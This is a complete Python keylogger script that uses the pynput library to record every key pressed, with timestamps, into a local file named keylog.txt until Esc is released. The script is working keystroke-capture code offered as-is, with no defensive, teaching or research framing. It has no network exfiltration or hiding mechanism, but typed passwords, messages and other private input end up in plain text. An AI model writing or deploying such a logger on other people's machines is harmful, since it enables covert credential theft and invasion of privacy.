from pynput import keyboard
import logging

# Configure logging
logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format="%(asctime)s: %(message)s")

# Event handler for key presses
def on_press(key):
    try:
        # Handle printable characters
        logging.info(f"{key.char}")
    except AttributeError:
        # Handle special keys
        if key == keyboard.Key.space:
            logging.info("[Space]")
        elif key == keyboard.Key.enter:
            logging.info("[Enter]")
        elif key == keyboard.Key.tab:
            logging.info("[Tab]")
        elif key == keyboard.Key.backspace:
            logging.info("[Backspace]")
        elif key == keyboard.Key.shift:
            logging.info("[Shift]")
        elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
            logging.info("[Ctrl]")
        elif key == keyboard.Key.esc:
            logging.info("[Esc]")
        else:
            logging.info(f"[Special Key: {key}]")

# Event handler for key release (to stop on ESC)
def on_release(key):
    if key == keyboard.Key.esc:
        return False  # Stop listener

# Start the keylogger
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
